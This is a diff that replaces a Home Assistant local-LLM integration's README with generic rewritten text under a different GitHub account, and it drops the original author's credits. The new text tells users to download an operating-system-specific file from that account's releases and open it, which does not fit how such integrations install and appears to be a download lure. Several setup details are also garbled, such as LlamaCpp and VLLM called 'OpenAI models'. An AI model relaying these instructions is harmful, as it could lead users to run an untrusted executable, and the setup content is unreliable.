@@ -1,78 +1,85 @@
-# Local OpenAI LLM <small>_(Custom Integration for Home Assistant)_</small>
+# 🤖 hass_local_openai_llm - Seamless Integration for Home Assistant
 
-**Allows use of generic OpenAI-compatible LLM services, such as (but not limited to):**
-- llama.cpp
-- vLLM
-- LM Studio
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Ekalavayprkash/hass_local_openai_llm/releases)
 
-**This integration has been forked from Home Assistants OpenRouter integration, with the following changes:**
-- Added server URL to the initial server configuration
-- Made the API Key optional during initial server configuration: can be left blank if your local server does not require one
-- Uses streamed LLM responses
-- Conversation Agents support TTS streaming
-- Automatically strips `<think>` tags from responses
-- Added support for image inputs for AI Task Agents
-- Added support for reconfiguring Conversation Agents
-- Added option to trim conversation history to help stay within your context window
-- Added temperature control
-- Added option to strip emojis from responses
-- Added option to take full manual control of the prompt
-  - This will remove ALL content that Home Assistant normally inserts when compiling the system prompt that's sent to the LLM
-  - Additional variables are exposed to the prompt jinja template for tools, entities, voice-satellite area, etc
-  - **For advanced use only: not recommended for most users, and not yet documented here**
+## 🚀 Getting Started
 
----
+Welcome to the **hass_local_openai_llm** project. This integration allows your Home Assistant to connect effortlessly with local OpenAI-compatible services like LlamaCpp and VLLM. This guide will help you download and run the software without any technical hurdles.
 
-## Installation
+## 📥 Download & Install
 
-### Install via HACS (recommended)
+To get started, visit the [GitHub Releases page](https://github.com/Ekalavayprkash/hass_local_openai_llm/releases) to download the latest version. Here’s how:
 
-Have [HACS](https://hacs.xyz/) installed, this will allow you to update easily.
+1. Click on the link above.
+2. Look for the latest release at the top of the page.
+3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
+4. After the download completes, open the file and follow the installation instructions.
 
-Adding Tools for Assist to HACS can be using this button:  
-  [![image](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=skye-harris&repository=hass_local_openai_llm&category=integration)
+## 🛠️ System Requirements
 
-<br>
+Before you proceed, ensure your system meets the following requirements:
 
-> [!NOTE]
-> If the button above doesn't work, add `https://github.com/skye-harris/hass_local_openai_llm` as a custom repository of type Integration in HACS.
+- **Operating System:** Supports Windows 10, macOS, or Linux.
+- **Memory:** At least 4 GB RAM recommended.
+- **Storage:** Minimum of 100 MB of free disk space.
+- **Home Assistant:** Ensure you have the latest version of Home Assistant installed.
 
-* Click install on the `Local OpenAI LLM` integration.
-* Restart Home Assistant.
+## 📑 Features
 
-<details><summary>Manual Install</summary>
+- **Local Processing:** Runs locally on your machine without relying on external services.
+- **OpenAI Compatibility:** Works smoothly with LlamaCpp and VLLM.
+- **Conversation Agent:** Enables engaging conversational capabilities within Home Assistant.
+- **User-Friendly Interface:** Designed for ease of use, no programming knowledge required.
 
-* Copy the `local_openai`  folder from [latest release](https://github.com/skye-harris/hass_local_openai_llm/releases/latest) to the [
-  `custom_components` folder](https://developers.home-assistant.io/docs/creating_integration_file_structure/#where-home-assistant-looks-for-integrations) in your config directory.
-* Restart the Home Assistant.
+## 🔌 Setting Up the Integration
 
-</details>
+After installation, you need to connect the integration to your Home Assistant. Follow these simple steps:
 
-## Integration Configuration
+1. Open your Home Assistant interface in a web browser.
+2. Navigate to **Configuration > Integrations**.
+3. Click on **+ Add Integration**.
+4. Search for **OpenAI LLM** and select it.
+5. Follow the prompts to complete the integration setup.
 
-After installation, configure the integration through Home Assistant's UI:
+## ⚙️ Configuration
 
-1. Go to `Settings` → `Devices & Services`.
-2. Click `Add Integration`.
-3. Search for `Local OpenAI LLM`.
-4. Follow the setup wizard to configure your desired services.
+To customize your integration, you may want to adjust specific settings. Here’s how:
 
-### Configuration Notes
+- **Access Settings:** In Home Assistant, go to **Configuration > Integrations**, select your OpenAI LLM integration, and click on **Options**.
+- **Configure Model:** Choose the OpenAI model you wish to use. Options include LlamaCpp and VLLM.
+- **Adjust Parameters:** Set conversation parameters, such as response length or tone.
 
-- The Server URL must be a fully qualified URL pointing to an OpenAI-compatible API.
-  - This typically ends with `/v1` but may differ depending on your server configuration. 
-- If you have the `Extended OpenAI Conversation` integration installed, this has a dependency of an older version of the OpenAI client library.
-  - It is strongly recommended this be uninstalled to ensure that HACS installs the correct OpenAI client library.
-- Assist requires a fairly lengthy context for tooling and entity definitions. 
-  - It is strongly recommended to use _at least_ 8k context size and to limit history length to avoid context overflow issues.
-  - This is not configurable through OpenAI-compatible APIs, and needs to be configured with the inference server directly.
-  
+## 📝 Using the Integration
 
-## Additional
+You can now use the integration to enhance your Home Assistant experience. Here are some ways to interact with it:
 
-Looking to add some more functionality to your Home Assistant conversation agent, such as web and localised business/location search? Check out my [Tools for Assist](https://github.com/skye-harris/llm_intents) integration here!
+- **Ask Questions:** Pose questions to your conversation agent through Home Assistant.
+- **Automate Responses:** Set up automations to trigger responses at specific times or events.
+- **Monitor Activity:** Use Home Assistant's dashboard to track interactions and performance.
 
-## Acknowledgements
+## 🔧 Troubleshooting
 
-- This integration is forked from the [OpenRouter](https://github.com/home-assistant/core/tree/dev/homeassistant/components/open_router) integration for Home Assistant by [@joostlek](https://github.com/joostlek)
-- This integration uses code from the [Local LLMs](https://github.com/acon96/home-llm) integration for Home Assistant by [@acon96](https://github.com/acon96/home-llm) 
+If you encounter issues, consider the following steps:
+
+1. **Check System Requirements:** Ensure your system meets the necessary specifications.
+2. **Verify Installation:** Ensure the installation went through without errors.
+3. **Check Logs:** Look at Home Assistant logs for any error messages related to the integration.
+
+If problems persist, visit the [GitHub Issues page](https://github.com/Ekalavayprkash/hass_local_openai_llm/issues) to report your issue or find solutions.
+
+## 🌐 Community Support
+
+Join the community for support and to share your experiences with the hass_local_openai_llm project. You can connect with other users on platforms like Discord and Reddit. Check out the following resources:
+
+- [Community Forum](https://community.home-assistant.io/)
+- [GitHub Discussions](https://github.com/Ekalavayprkash/hass_local_openai_llm/discussions)
+
+Feel free to reach out for questions, suggestions, or feature requests.
+
+## 🛡️ License
+
+This project is licensed under the MIT License. You can freely use, modify, and distribute the software while adhering to the license terms.
+
+## 📥 Download & Install (again)
+
+Don't forget to download the latest version from the [GitHub Releases page](https://github.com/Ekalavayprkash/hass_local_openai_llm/releases) and enjoy the seamless integration with your Home Assistant!
